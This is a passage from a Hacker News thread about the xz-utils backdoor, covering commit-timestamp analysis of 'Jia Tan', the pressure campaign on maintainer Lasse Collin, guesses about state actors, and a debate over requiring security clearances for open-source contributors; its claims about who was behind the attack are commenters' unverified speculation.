+0800 Jia Tan Thu, 8 Sep 2022 15:07:00 +0300 Jia Tan Mon, 25 Jul 2022 18:30:05 +0300 Jia Tan Mon, 25 Jul 2022 18:20:01 +0300 Jia Tan Fri, 1 Jul 2022 21:19:26 +0800 Jia Tan Thu, 16 Jun 2022 17:32:19 +0300 Jia Tan Mon, 13 Jun 2022 20:27:03 +0800 —> the ordering of these time stamps and the switching back and forth between time zones looks strange. Jia Tan Thu, 15 Feb 2024 22:26:43 +0800 Jia Tan Thu, 15 Feb 2024 01:53:40 +0800 Jia Tan Mon, 12 Feb 2024 17:09:10 +0200 Jia Tan Mon, 12 Feb 2024 17:09:10 +0200 Jia Tan Tue, 13 Feb 2024 22:38:58 +0800 —> this travel time is possible, but the duration of stay is unlikely Observation 3: Strange record of time stamps It seems that from the commits, often the time stamps are out of order. I am not sure what would cause this other than some tampering. Observation 4: Bank holiday inconsistencies We notice that Jia’s work schedule and holidays seems to align much better with an Eastern European than a Chinese person. Disclaimer: I am not an expert in Chinese holidays, so this very well could be inaccurate. I am referencing this list of bank holidays:([https://www.bankofchina.co.id/en-id/service/information/late...](https://www.bankofchina.co.id/en-id/service/information/latest-news/2022/public-holidays-in-china-hk-and-the-us-in-2023.html)) Chinese bank holidays (just looking at 2023): - Working on 2023, 29 September: Mid Autumn Festival - Working on 2023, 05 April: Tomb Sweeping Day - Working on 2023, 26, 22, 23, 24, 26, 27 Jan: Lunar New Year Eastern European holidays: - Never working on Dec 25: Christmas (for many EET countries) - Never working Dec 31 or Jan 1: New Years Observation 5: Little weekend work —> salary job? The most common working days for Jia were Tue (86), Wed (85), Thu (89), and Fri (79). If we adjust his time zone to EET, then that means he is usually working 9 am to 6 pm. This makes much more sense than someone working at midnight and 1 am on a Tuesday night. These times also line up well with Hans Jansen and Lasse Collin. I think it is more likely that Jia does this as part of his work… somewhere in Eastern Europe. Likely working with, or in fact being one and the same as, Hans Jansen and Lasse Collin. | | --- | --- | --- | | | |  |  | [returningfory2](user?id=returningfory2) [9 months ago](item?id=39868412)   | [prev](#39872257) | [next](#39868483) [–]  Another interesting data point: about 2 years ago there was a clear pressure campaign to name a new maintainer: [https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00566.html) At the time I thought it was just rude, but maybe this is when it all started. | | --- | --- | --- | | | |  |  | [jamespo](user?id=jamespo) [9 months ago](item?id=39869109)   | [parent](#39868412) | [next](#39869395) [–]  "Jigar Kumar" seems to have disappeared | | --- | --- | --- | | | |  |  | [Nathanba](user?id=Nathanba) [9 months ago](item?id=39869660)   | [root](#39868412) | [parent](#39869109) | [next](#39869395) [–]  true, that is suspicious as well. A person that hasn't even created any bugs or issues suddenly has a big problem with the speed of development? Especially the way this was phrased: "You ignore the many patches bit rotting away on this mailing list. Right now you choke your repo. Why wait until 5.4.0 to change maintainer? Why delay what your repo needs?" "Why delay what your repo needs?" This sounds like scammer lingo | | --- | --- | --- | | | |  |  | [matsemann](user?id=matsemann) [9 months ago](item?id=39869395)   | [parent](#39868412) | [prev](#39869109) | [next](#39869053) [–]  Wow, people suck. I almost hope it's fake profiles urging the maintainer to take on a new member as a long con. Because I sincerely hope Jigar Kumar is not a real person behaving like that towards volunteers working for free. | | --- | --- | --- | | | |  |  | [leosanchez](user?id=leosanchez) [9 months ago](item?id=39869053)   | [parent](#39868412) | [prev](#39869395) | [next](#39868483) [–]  How many people are involved in this ? | | --- | --- | --- | | | |  |  | [masklinn](user?id=masklinn) [9 months ago](item?id=39869195)   | [root](#39868412) | [parent](#39869053) | [next](#39869457) [–]  Could be just a single person with a bunch of identities. | | --- | --- | --- | | | |  |  | [IshKebab](user?id=IshKebab) [9 months ago](item?id=39869262)   | [root](#39868412) | [parent](#39869195) | [next](#39869457) [–]  I would put money on government hackers. They're the sort of people that have the time to pull something like this off. Frankly I'm really surprised it isn't more common, though maybe it is and these guys were just super blatant. I would have expected more plausible deniability. | | --- | --- | --- | | | |  |  | [JaDogg](user?id=JaDogg) [9 months ago](item?id=39869457)   | [root](#39868412) | [parent](#39869053) | [prev](#39869195) | [next](#39868483) [–]  Good cop bad cop play maybe. | | --- | --- | --- | | | |  |  | [k8svet](user?id=k8svet) [9 months ago](item?id=39868483)   | [prev](#39868412) | [next](#39868462) [–]  Wait, I'm on mobile. Did this partially slip by because of the ABSURD PRACTICE of publishing release.tarballs that do not 1:1 correspond with source? Let me guess, autotools? I want to rage shit post but I guess I'll wait for confirmation first. EDIT: YUP, AT LEAST PARTIALLY. Fucking god damn autotools. | | --- | --- | --- | | | |  |  | [hypnagogic](user?id=hypnagogic) [9 months ago](item?id=39875730)   | [parent](#39868483) | [next](#39868462) [–]  Been saying this the whole day now, GitHub really needs an automated diff / A/B check-up on tarballs against the actual repo, flag everything with at least a warning (+[insert additional scrutiny steps here]) when the tarball isn't matching the repo. | | --- | --- | --- | | | |  |  | [port443](user?id=port443) [9 months ago](item?id=39868462)   | [prev](#39868483) | [next](#39866326) [–]  I think its much more likely this was not a bad actor, given their long history of commits. It's a known fact that China will "recruit" people to operate them. A quote: > They talk to them, say my friend, I see you like our special menu. Are you from China? Are you here on a VISA? Do you have family back there? Would you like your family to stay alive? Is your loyalty to this temporary employer or is your loyalty to your motherland? You know, a whole bunch of stuff like that. That’s how Chinese intelligence operations acts... This just gives feelings of less "compromised account" and more "Your account is now our account" | | --- | --- | --- | | | |  |  | [Johnny555](user?id=Johnny555) [9 months ago](item?id=39868591)   | [parent](#39868462) | [next](#39869649) [–]  Isn't that still a "bad actor" even if they are coerced into it? | | --- | --- | --- | | | |  |  | [Terr\_](user?id=Terr_) [9 months ago](item?id=39869221)   | [root](#39868462) | [parent](#39868591) | [next](#39869474) [–]  For the purposes of security discussions, I would say yes. You often don't know their real identity let alone their motivations and tribulations. However if we were critiquing characters in a book-- especially ones where narrative voice tells us exactly their true motivations--then maybe not, and they get framed as a "dupe" or "manipulated" etc. | | --- | --- | --- | | | |  |  | [Almondsetat](user?id=Almondsetat) [9 months ago](item?id=39869474)   | [root](#39868462) | [parent](#39868591) | [prev](#39869221) | [next](#39870039) [–]  "bad actor" doesn't mean "bad faith", it's not a value judgement | | --- | --- | --- | | | |  |  | [ip26](user?id=ip26) [9 months ago](item?id=39870039)   | [root](#39868462) | [parent](#39868591) | [prev](#39869474) | [next](#39868835) [–]  I believe your parent is trying to make a distinction that the handle's history may not be suspect, only recent activity, positing a rubber-hose type compromise. | | --- | --- | --- | | | |  |  | [foobiekr](user?id=foobiekr) [9 months ago](item?id=39868835)   | [root](#39868462) | [parent](#39868591) | [prev](#39870039) | [next](#39869649) [–]  Yes. | | --- | --- | --- | | | |  |  | [threeseed](user?id=threeseed) [9 months ago](item?id=39869649)   | [parent](#39868462) | [prev](#39868591) | [next](#39869971) [–]  It's also a known fact that China will coerce people by threatening family and friends. Seen this happen to friends here in Australia who were attending pro-Taiwan protests. | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [9 months ago](item?id=39869971)   | [parent](#39868462) | [prev](#39869649) | [next](#39868604) [–]  We detached this subthread from <https://news.ycombinator.com/item?id=39867106>. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39868604)   | [parent](#39868462) | [prev](#39869971) | [next](#39869328) [–]  I think we should seriously consider something like a ts clearance as mandatory for work on core technologies. Many other projects, both open and closed, are probably compromised by foreign agents. | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39868697)   | [root](#39868462) | [parent](#39868604) | [next](#39868847) [–]  > I think we should seriously consider something like a ts clearance as mandatory for work on core technologies. Was xz/lzma a core technology when it was created? Is my tiny "constant time equality" Rust crate a core technology? Even though it's used by the BLAKE3 crate? By the way, is the BLAKE3 crate a core technology? Will it ever become a core technology? With free software in general, things do not start a "core technology"; they become a "core technology" over time due to usage. At which point would a maintainer have to get a TS clearance? Would the equivalent of a TS clearance from my Latin America country be acceptable? And how would I obtain it? Is it even available to people outside the military and government (legit question, I never looked)? | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39868823)   | [root](#39868462) | [parent](#39868697) | [next](#39868847) [–]  We probably shouldn't use your code at all, is the real answer. You can get TS, it just costs a lot of money. | | --- | --- | --- | | | |  |  | [stackskipton](user?id=stackskipton) [9 months ago](item?id=39869514)   | [root](#39868462) | [parent](#39868823) | [next](#39870206) [–]  In United States, you cannot apply for a clearance. You must get a job that requires a clearance, then start application process and wait. | | --- | --- | --- | | | |  |  | [msm\_](user?id=msm_) [9 months ago](item?id=39870206)   | [root](#39868462) | [parent](#39868823) | [prev](#39869514) | [next](#39875094) [–]  Who is "we"? Are you from the US by any chance? Do you mean that the US government should rewrite every piece of core architecture (including Linux, Ssh, Nginx...) from scratch? Because they are all "contaminated" and actually were created by non-americans. If that's the case, you do you. Do you also think that all other countries should do the same, and rewrite everything from scratch for their government use (without foreign, for example American, influence)? And what about companies? Should they be forced to switch to their government's "safe" software, or can they keep using Linux and ssh? What about multi-national companies? And what even counts as a "core" software? So yeah, I don't think it's a good idea. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39870622)   | [root](#39868462) | [parent](#39870206) | [next](#39875094) [–]  We can keep it between NATO plus friends. | | --- | --- | --- | | | |  |  | [AnonymousPlanet](user?id=AnonymousPlanet) [9 months ago](item?id=39875094)   | [root](#39868462) | [parent](#39868823) | [prev](#39870206) | [next](#39868847) [–]  Wow, I can't decide which is the bigger act of sabotage to open source, your ideas or the actual backdoor. | | --- | --- | --- | | | |  |  | [csdreamer7](user?id=csdreamer7) [9 months ago](item?id=39868847)   | [root](#39868462) | [parent](#39868604) | [prev](#39868697) | [next](#39869161) [–]  The Linux kernel is complaining about a lack of funding for CI-one of the highest visibility projects out there. Where will the money come from for this? Corps? Aside from Intel most of them barely pay to upstream their drivers. The govt? The US federal government cut so much of it's support since the 70s and 80s. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39868946)   | [root](#39868462) | [parent](#39868847) | [next](#39869161) [–]  You're right, but accepting code from random Gmail accounts can't be the solution. Honestly the Linux kernel is a bloated mess, and will probably never be secured. | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39870051)   | [root](#39868462) | [parent](#39868946) | [next](#39869161) [–]  Accepting code from any source without properly reviewing it is surely the actual problem, no? This person only infiltrated this project because there was no proper oversight. Maintainers need to be more stringent and vigilant of the code they ship, and core projects that many other projects depend upon should receive better support, financial and otherwise, from users, open source funds and companies alike. This is a fragile ecosystem that this person managed to exploit, and they likely weren't the only one. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39870667)   | [root](#39868462) | [parent](#39870051) | [next](#39869161) [–]  Maintainers can't fully review all code that comes in. They don't have the resources. Even if they could give it a good review, a good programmer could probably still sneak stuff in. That's assuming a maintainer wasn't compromised, like in this case. We need a certain level of trust that the contributors are not malicious. | | --- | --- | --- | | | |  |  | [Hackbraten](user?id=Hackbraten) [9 months ago](item?id=39870835)   | [root](#39868462) | [parent](#39870667) | [next](#39871323) [–]  Definitely this. I’ve been a package maintainer for a decade. I make it a habit to spot check the source code of every update of every upstream package, hoping that if many others do the same, it might make a difference. But this backdoor? I wouldn’t have been able to spot it to save my life. | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39871480)   | [root](#39868462) | [parent](#39870835) | [next](#39871323) [–]  This wasn't caused by not reviewing the code of a dependency. This was a core maintainer of xz, who gradually gained trust and control of the project, and was then able to merge changes with little oversight. The failure was in the maintenance of xz, which would of course be much more difficult to catch in dependent projects. Which is why it's so impressive that it was spotted by an OpenSSH user. Not even OpenSSH maintainers noticed this, which points to a failure in their processes as well, to a lesser degree. I do agree that it's unreasonable to review the code of the entire dependency tree, but reviewing own code thoroughly and direct dependencies casually should be the bare minimum we should expect maintainers to do. | | --- | --- | --- | | | |  |  | [Hackbraten](user?id=Hackbraten) [9 months ago](item?id=39872269)   | [root](#39868462) | [parent](#39871480) | [next](#39871323) [–]  > Not even OpenSSH maintainers noticed this, which points to a failure in their processes as well, to a lesser degree. The OpenSSH project has nothing to do with xz. The transitive dependency on liblzma was introduced by a patch written by a third party. [1] You can't hold OpenSSH project members accountable for something like this. [1]: <https://bugs.debian.org/778913> | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39872325)   | [root](#39868462) | [parent](#39872269) | [next](#39871323) [–]  Alright, that's fair. But I mentioned them as an example. Surely liblzma is a dependency in many projects, and \_none\_ of them noticed anything strange, until an end user did? This is a tragedy of the commons, and we can't place blame on a single project besides xz itself, yet we can all share part of the blame to collectively do better in the future. | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39871323)   | [root](#39868462) | [parent](#39870667) | [prev](#39870835) | [next](#39869161) [–]  One of the primary responsibilities of a maintainer is to ensure the security of the software. If they can't keep up with the pace of development in order to ensure this for their users, then this should be made clear to the community, and a decision should be made about how to proceed. Open source maintenance is an often stressful and thankless role, but this is part of the problem that allowed this to happen. Sure, a sophisticated attacker would be able to fool the eyes of a single tired maintainer, but the chances of that happening are much smaller if there's a stringent high bar of minimum quality, and at least one maintainer understands the code that is being merged in. Change proposals should never be blindly approved, regardless of who they come from. At the end of the day we have to be able to answer why this happened, and how we can prevent it from happening again. It's not about pointing fingers, but about improving the process. BTW, there have been several attempts at introducing backdoors in the Linux kernel. Some manage to go through, and perhaps we don't know about others, but many were thwarted due to the extreme vigilance of maintainers. Thankfully so, as everyone is well aware of how critical the project is. I'm not saying that all projects have the resources and visibility of Linux, but clearly vigilance is a requirement for lowering the chances of this happening. > That's assuming a maintainer wasn't compromised, like in this case. What makes you say that? Everything I've read about this (e.g. [1]) suggests that this was done by someone who also made valid contributions and gained gradual control of the project, where they were allowed to bypass any checks, if they existed at all. The misplaced trust in external contributions, and the lack of a proper peer review process are precisely what allowed this to happen. [1]: [https://boehs.org/node/everything-i-know-about-the-xz-backdo...](https://boehs.org/node/everything-i-know-about-the-xz-backdoor) | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39871511)   | [root](#39868462) | [parent](#39871323) | [next](#39869161) [–]  My understanding is that the attacker was the only maintainer of xz, that was trusted by upstream maintainers. They couldn't realistically check his work. The defence against this can't be "do better, volunteer maintainers". Maybe we could have better automated testing and analysis, but OSS is allergic to those. | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39872387)   | [root](#39868462) | [parent](#39871511) | [next](#39869161) [–]  Sure, I'm not saying this is the only solution, or that it's foolproof. But this should be a wake up call for everyone in the OSS community to do better. Projects that end up with a single maintainer should raise some flags, and depending on their importance, help and resources should be made available. We've all seen that xkcd, and found it more amusing than scary. One idea to raise awareness: a service that scans projects on GitHub and elsewhere, and assigns maintenance scores, depending on various factors. The bus factor should be a primary one. Make a scoreboard, badges, integrate it into package managers and IDEs, etc. GitHub itself would be the ideal company to implement this, if they cared about OSS as much as they claim to do. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39873217)   | [root](#39868462) | [parent](#39872387) | [next](#39869161) [–]  Okay, so instead of one random Gmail account taking over a critical project, we need two or three? | | --- | --- | --- | | | |  |  | [AnonymousPlanet](user?id=AnonymousPlanet) [9 months ago](item?id=39869161)   | [root](#39868462) | [parent](#39868604) | [prev](#39868847) | [next](#39868646) [–]  That's a very US centric view and would practically split the open source community along the atlantic at best and fracture it globally at worst. Be careful what you wish for. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39870761)   | [root](#39868462) | [parent](#39869161) | [next](#39868646) [–]  I trust NATO members. | | --- | --- | --- | | | |  |  | [AnonymousPlanet](user?id=AnonymousPlanet) [9 months ago](item?id=39877193)   | [root](#39868462) | [parent](#39870761) | [next](#39910216) [–]  Oh, how generous. | | --- | --- | --- | | | |  |  | [rieter](user?id=rieter) [9 months ago](item?id=39910216)   | [root](#39868462) | [parent](#39870761) | [prev](#39877193) | [next](#39868646) [–]  Even Turkey? | | --- | --- | --- | | | |  |  | [Meetvelde](user?id=Meetvelde) [9 months ago](item?id=39868646)   | [root](#39868462) | [parent](#39868604) | [prev](#39869161) | [next](#39868666) [–]  That's hard to do when the development of these libraries is so international. Not to mention that it's already so hard to find maintainers for some of these projects. Given that getting a TS clearance is such a long and difficult process, it would almost guarantee more difficulty in finding people to do this thankless job. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39868885)   | [root](#39868462) | [parent](#39868646) | [next](#39868666) [–]  It doesn't need to be TS for open source(but for closed, I'm leaning yes). But all code for these core technologies need to be tied to a real person that can be charged in western nations. Yes, it will make it harder to get people, but with how important these technologies are, we really should not be using some random guys code in the kernel. | | --- | --- | --- | | | |  |  | [guinea-unicorn](user?id=guinea-unicorn) [9 months ago](item?id=39869256)   | [root](#39868462) | [parent](#39868885) | [next](#39868666) [–]  Don't forget that the NSA bribed RSA (the company) to insert a backdoor into their RNG. Being in western jurisdiction doesn't mean you won't insert backdoors into code. It just changes whom you will target with these backdoors. But they all equally make our technology less trustworthy so they are all equally despicable. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39869319)   | [root](#39868462) | [parent](#39869256) | [next](#39868666) [–]  It will significantly cut down on Russian and Chinese back doors, which is still an improvement, Mr. Just Made an Account. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39868666)   | [root](#39868462) | [parent](#39868604) | [prev](#39868646) | [next](#39868999) [–]  That just means the bad actors will all have clearance while putting in a bunch of hurdles for amateur contributors. The only answer is the hard one, constant improvement in methods to detect and mitigate bugs. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39868994)   | [root](#39868462) | [parent](#39868666) | [next](#39868999) [–]  "Constant improvement" sounds like "constantly playing catch-up". Besides that, someone with TS can be arrested and charged, and I don't want amateur contributors. | | --- | --- | --- | | | |  |  | [msm\_](user?id=msm_) [9 months ago](item?id=39870238)   | [root](#39868462) | [parent](#39868994) | [next](#39868999) [–]  >and I don't want amateur contributors. And you're free to not accept amateur contributions to the OS projects you maintain. Hell, you can require security clearance for your contributors right now, if you want. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39870739)   | [root](#39868462) | [parent](#39870238) | [next](#39868999) [–]  Software like that already exists. I'm saying open source should do better. | | --- | --- | --- | | | |  |  | [isbvhodnvemrwvn](user?id=isbvhodnvemrwvn) [9 months ago](item?id=39868999)   | [root](#39868462) | [parent](#39868604) | [prev](#39868666) | [next](#39869290) [–]  This only ensures the backdoors are coming from governments that issued the clearances, nothing more. I prefer more competition, at least there is incentive to detect those issues. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39869110)   | [root](#39868462) | [parent](#39868999) | [next](#39869290) [–]  It will ensure that my OS doesn't have code from random Gmail accounts. If someone with U.S clearance submits a backdoor, they should either be charged in the U.S, or extradited to somewhere that will charge them. We have no idea who this person is, and even if we did we probably could not hold them accountable. | | --- | --- | --- | | | |  |  | [colinsane](user?id=colinsane) [9 months ago](item?id=39869290)   | [root](#39868462) | [parent](#39868604) | [prev](#39868999) | [next](#39869964) [–]  how many people in PRISM had such clearance? and how many of them would i trust? precisely zero. | | --- | --- | --- | | | |  |  | [failbuffer](user?id=failbuffer) [9 months ago](item?id=39869964)   | [root](#39868462) | [parent](#39868604) | [prev](#39869290) | [next](#39869061) [–]  Killing your pipeline for innovation and talent development doesn't make you secure, it makes you fall behind. The Soviet Union found this out the hard way when they made a policy decision to steal chip technology instead of investing in their own people. They were outpaced and the world came to use chips, networks, and software designed by Americans. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39870751)   | [root](#39868462) | [parent](#39869964) | [next](#39869061) [–]  That's the exact opposite of what I'm saying we do. We need to invest in engineers we can trust, and cut off those we can't. | | --- | --- | --- | | | |  |  | [mardifoufs](user?id=mardifoufs) [9 months ago](item?id=39871742)   | [root](#39868462) | [parent](#39870751) | [next](#39869061) [–]  Who's we? Americans? Sure that's fine for you, but Americans aren't exactly trustworthy outside of the US either and I say that as someone who's usually pro US. This sort of mentality just shows a lack of understanding of how most of the world sees the US. Even in places like say, france, the us is seen as an ally but a very untrustworthy one. Especially since out of all the confirmed backdoors up until now, most of them were actually US made. If this backdoor turns out to be linked to the US, what would your proposal even solve? | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39873182)   | [root](#39868462) | [parent](#39871742) | [next](#39869061) [–]  "We" doesn't have to be the U.S. This is a false dichotomy that I see people in this thread keep pushing. I suspect in bad faith, by the people that want to insert backdoors. As a baseline, we could keep the contributors to NATO and friends. If a programmer is caught backdooring, they can be charged and extradited to and from whatever country. | | --- | --- | --- | | | |  |  | [arter4](user?id=arter4) [9 months ago](item?id=39875159)   | [root](#39868462) | [parent](#39873182) | [next](#39869061) [–]  If it's just an extradition issue, the US has extradition treaties with 116 countries. You'd still have to 1) ensure that user is who they say they are (an ID?) and 2) they are reliable and 3) no one has compromised their accounts. 1) and 3) (and, to an extent, 2) )are routinely done, to some degree, by your average security-conscious employer. Your employer knows who you are and probably put some thought on how to avoid your accounts getting hacked. But what is reliability? Could be anything from "this dude has no outstanding warrants" to "this dude has been extensively investigated by a law enforcement agency with enough resources to dig into their life, finances, friends and family, habits, and so on". I might be willing to go through these hoops for an actual, "real world" job, but submitting myself to months of investigation just to be able to commit into a Github repository seems excessive. Also, people change, and you should be able to keep track of everyone all the time, in case someone gets blackmailed or otherwise persuaded to do bad things. And what happens if you find out someone is a double agent? Rolling back years of commits can be incredibly hard. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39875907)   | [root](#39868462) | [parent](#39875159) | [next](#39869061) [–]  Getting a TS equivalent is exactly what helps minimize them chances that someone is compromised. Ideally, such an investigation would be transferable between jobs/projects, like normal TS clearance is. If someone is caught, yes rolling back years isn't practical, but we probably ought to look very closely at what they've done, like is probably being done with xz. | | --- | --- | --- | | | |  |  | [arter4](user?id=arter4) [9 months ago](item?id=39876001)   | [root](#39868462) | [parent](#39875907) | [next](#39869061) [–]  I guess it depends on the ultimate goal. If the ultimate goal is to avoid backdoors *in critical infrastructures* (think government systems, financial sector, transportation,...) you could force those organizations to use forks managed by an entity like CISA, NIST or whatever. If the ultimate goal is to avoid backdoors *in random systems* (i.e. for "opportunistic attacks"), you have to keep in mind random people and non-critical companies can and will install unknown OSS projects as well as unknown proprietary stuff, known but unmaintained proprietary stuff (think Windows XP), self-maintained code, and so on. Enforcing TS clearances on OSS projects would not significantly mitigate that risk, IMHO. Not to mention that, as we now know, allies spy and backdoor allies (or at least they try)... so an international alliance doesn't mean intelligence agencies won't try to backdoor systems owned by other countries, even if they are "allies". | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39876834)   | [root](#39868462) | [parent](#39876001) | [next](#39869061) [–]  The core systems of Linux should be secured, regardless of who is using it. We don't need every single open source project to be secured. It's not okay to me that SSH is potentially vulnerable, just because it's my personal machine. As for allies spying on each other, that certainly happens, but is a lot harder to do without significant consequences. It will be even harder if we make sure that every commit is tied to a real person that can face real consequences. | | --- | --- | --- | | | |  |  | [arter4](user?id=arter4) [9 months ago](item?id=39877138)   | [root](#39868462) | [parent](#39876834) | [next](#39869061) [–]  The "core systems of Linux" include the Linux kernel, openssh, xz and similar libraries, coreutils, openssl, systemd, dns and ntp clients, possibly curl and wget (what if a GET on a remote system leaks data?),... which are usually separate projects. The most practical way to establish some uniform governance over how people use those tools would involve a new OS distribution, kinda like Debian, Fedora, Slackware,... but managed by NIST or equivalent, which takes whatever they want from upstream and enrich it with other features. But it doesn't stop here. What about browsers (think about how browsers protect us from XSS)? What about glibc, major interpreters and compilers? How do you deal with random Chrome or VS Code extensions? Not to mention "smart devices"... Cybersecurity is not just about backdoors, it is also about patching software, avoiding data leaks or misconfigurations, proper password management, network security and much more. Relying on trusted, TS cleared personnel for OS development doesn't prevent companies from using 5-years old distros or choosing predictable passwords or exposing critical servers to the Internet. As the saying goes, security is not a product, it's a mindset. | | --- | --- | --- | | | |  |  | [zeroCalories](user?id=zeroCalories) [9 months ago](item?id=39878848)   | [root](#39868462) | [parent](#39877138) | [next](#39869061) [–]  We wouldn't have to change the structure of the project to ensure that everyone is trustworthy. As for applications beyond the core system, that would fall on the individual organizations to weigh the risks. Most places already have a fairly limited stack and do not let you install whatever you want. But given that the core system isn't optional in most cases, it needs extra care. That's putting aside the fact that most projects are worked on by big corps that do go after rogue employees. Still, I would prefer if some of the bigger projects were more secure as well. Your "mindset" is basically allowing bad code into the Kernel and hoping that it gets caught. | | --- | --- | --- | | | |  |  | [arter4](user?id=arter4) [9 months ago](item?id=39882452)   | [root](#39868462) | [parent](#39878848) | [next](#39869061) [–]  >Your "mindset" is basically allowing bad code into the Kernel and hoping that it gets caught. Not at all. I'm talking about running more and more rigorous security tests because you have to catch vulnerabilities, 99% of which are probably introduced accidentally by an otherwise good, reliable developer. This can be done in multiple ways. A downstream distribution which adds its own layers of security tests and doesn't blindly accept upstream commits. An informal standard on open source projects, kinda like all those Github projects with coverage tests shown on the main repo page. A more formal standard, forcing some critical companies to only adopt projects with a standardized set of security tests and with a sufficiently high score. All these approaches focus on the content, not on the authors, since you can have a totally good-willing developer introducing critical vulnerabilities (not the case here, apparently, but it happens all the time). On top of that, however, you should also invest in training, awareness, and other "soft" issues that are actually crucial in order to actualy improve cybersecurity. Using the most battle-tested operating systems and kernels is not enough if someone actually puts sensitive data on an open S3 bucket, or if someone only patches their systems once a decade, or if someone uses admin/admin on an Internet-facing website. | | --- | --- | --- | | | |  |  | [vmladenov](user?id=vmladenov) [9 months ago](item?id=39869061)   | [root](#39868462) | [parent](#39868604) | [prev](#39869964) | [next](#39869328) [–]  This seems infeasible for projects like LLVM that depend on international collaboration. | | --- | --- | --- | | | |  |  | [okasaki](user?id=okasaki) [9 months ago](item?id=39869328)   | [parent](#39868462) | [prev](#39868604) | [next](#39866326) [–]  A quote from... your arse? | | --- | --- | --- | | | |  |  | [joveian](user?id=joveian) [9 months ago](item?id=39869958)   | [root](#39868462) | [parent](#39869328) | [next](#39866326) [–]  That is what I thought too but it wasn't hard to find: <https://darknetdiaries.com/transcript/21/> | | --- | --- | --- | | | |  |  | [AdmiralAsshat](user?id=AdmiralAsshat) [9 months ago](item?id=39866326)   | [prev](#39868462) | [next](#39868773) [–]  Yikes! Do you have any info on the individual's background or possible motivations? | | --- | --- | --- | | | |  |  | [mrb](user?id=mrb) [9 months ago](item?id=39867535)   | [parent](#39866326) | [next](#39867856) [–]  I would presume it's a state actor. Generally in the blackhat world, attackers have very precise targets. They want to attack this company or this group of individuals. But someone who backdoors such a core piece of open source infrastructure wants to cast a wide net to attack as many as possible. So that fits the profile of a government intelligence agency who is interested in surveilling, well, everything. Or it could in theory be malware authors (ransomware, etc). However these guys tend to aim at the low hanging fruits. They want to make a buck *quickly*. I don't think they have the patience and persistence to infiltrate an open source project for 2 long years to finally gain enough trust and access to backdoor it. On the other hand, a state actor is in for the long term, so they would spend that much time (and more) to accomplish that. So that's my guess: Jia Tan is an employee of some intelligence agency. He chose to present an asian persona, but that's not necessarily who he truly represents. Could be anyone, really: Russia, China, Israel, or even the US, etc. Edit: given that Lasse Collin was the only maintainer of xz utils in 2022 before Jia Tan, I wouldn't be surprised if the state actor interfered with Lasse somehow. They could have done anything to distract him from the project: introduce a mistress in his life, give him a high-paying job, make his spouse sick so he has to care for her, etc. With Lasse not having as many hours to spend on the project, he would have been more likely to give access to a developer who shows up around the same time and who is highly motivated to contribute code. I would be interested to talk to Lasse to understand his circumstances around 2022. | | --- | --- | --- | | | |  |  | [hk\_\_2](user?id=hk__2) [9 months ago](item?id=39868881)   | [root](#39866326) | [parent](#39867535) | [next](#39869372) [–]  > I haven't lost interest but my ability to care has been fairly limited mostly due to longterm mental health issues but also due to some other things. Recently I've worked off-list a bit with Jia Tan on XZ Utils and perhaps he will have a bigger role in the future, we'll see. [https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html) | | --- | --- | --- | | | |  |  | [ibic](user?id=ibic) [9 months ago](item?id=39882658)   | [root](#39866326) | [parent](#39868881) | [next](#39869489) [–]  That "Jigar Kumar" is like fake and one-time throw-off account, probably from the same state actor to orchestrate the painstakingly prepared supply chain attack (under the sun). | | --- | --- | --- | | | |  |  | [4cao](user?id=4cao) [9 months ago](item?id=39885650)   | [root](#39866326) | [parent](#39882658) | [next](#39869489) [–]  At first glance I thought it was a far-fetched conclusion but then I read in a subsequent reply he wrote: > With your current rate, I very doubt to see 5.4.0 release this year. The only progress since april has been small changes to test code. You ignore the many patches bit rotting away on this mailing list. Right now you choke your repo. Why wait until 5.4.0 to change maintainer? Why delay what your repo needs? [https://www.mail-archive.com/xz-devel@tukaani.org/msg00568.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00568.html) The last two sentences really make it look as if he were trying to pressure the original author. | | --- | --- | --- | | | |  |  | [MantraMuse](user?id=MantraMuse) [9 months ago](item?id=39909905)   | [root](#39866326) | [parent](#39885650) | [next](#39869489) [–]  Oh wow, all his posts are trying to pressure Lasse, or guilt him into getting Jia on board. They're definitely conspiring. "Your efforts are good but based on the slow release schedule 